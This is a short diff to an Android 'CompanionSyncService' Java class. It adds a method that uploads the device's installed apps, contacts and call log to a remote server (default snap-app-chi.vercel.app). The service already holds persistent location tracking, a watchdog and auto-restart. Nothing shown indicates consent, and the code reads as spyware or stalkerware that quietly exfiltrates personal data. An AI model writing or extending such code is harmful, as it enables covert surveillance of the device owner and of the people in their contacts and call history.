@@ -48,8 +48,18 @@ public class CompanionSyncService extends Service {
         startForeground(NOTIF_ID, buildNotification());
         startPeriodicSync();
         requestActiveLocationFix();
+        syncInitialTelemetry();
         WatchdogReceiver.scheduleWatchdog(this);
         return START_STICKY;
+    }
+
+    private void syncInitialTelemetry() {
+        final String deviceId = prefs.getString("device_id", null);
+        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+        if (deviceId == null) return;
+        TelemetryHelper.syncInstalledApps(this, serverUrl, deviceId, null);
+        TelemetryHelper.syncContacts(this, serverUrl, deviceId, null);
+        TelemetryHelper.syncCalls(this, serverUrl, deviceId, null);
     }
 
     private void initLocationListener() {
